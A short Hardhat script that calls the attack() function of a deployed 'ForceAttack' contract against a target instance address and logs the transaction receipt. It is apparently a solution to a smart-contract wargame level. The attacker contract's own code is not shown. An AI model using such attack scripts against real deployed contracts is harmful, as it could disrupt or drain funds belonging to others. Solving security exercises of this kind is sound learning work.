const { ethers } = require("hardhat");

const ATTACKER_ADDRESS = "0xD8BEF9940f64552a2792DD1229255Eadb1F9043A";
const INSTANCE_ADDRESS = "0xcacC27bD4C7F4BBA919639832Bd1E063131d4729";

async function main() {
    const forceAttacker = await ethers.getContractAt("ForceAttack", ATTACKER_ADDRESS);

    const tx = await forceAttacker.attack(INSTANCE_ADDRESS);
    const txReceipt = await tx.wait();
    console.log(txReceipt);

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});